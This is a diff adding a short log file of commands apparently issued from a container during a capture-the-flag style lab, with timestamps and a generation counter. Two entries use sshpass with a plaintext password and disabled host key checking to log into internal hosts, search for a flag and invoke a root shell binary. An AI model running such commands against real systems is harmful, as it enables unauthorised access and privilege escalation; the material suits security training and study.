@@ -1,0 +1,4 @@
+docker_id;generation;full_time;service;command
+46bfca7e-b7ba-4101-a737-fce8553d2332;3;2025-10-13 13:41:54;-1;yes
+46bfca7e-b7ba-4101-a737-fce8553d2332;3;2025-10-13 13:42:18;-1;sshpass -p 'p@ssword' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 ot-user@10.0.0.11 "ls -la / | grep -i flag" 2>&1 | head -5
+46bfca7e-b7ba-4101-a737-fce8553d2332;3;2025-10-13 13:42:38;-1;sshpass -p 'p@ssword' ssh ot-user@10.0.0.X "/usr/bin/rootshell/myShell; cat /chemin/au/flag"
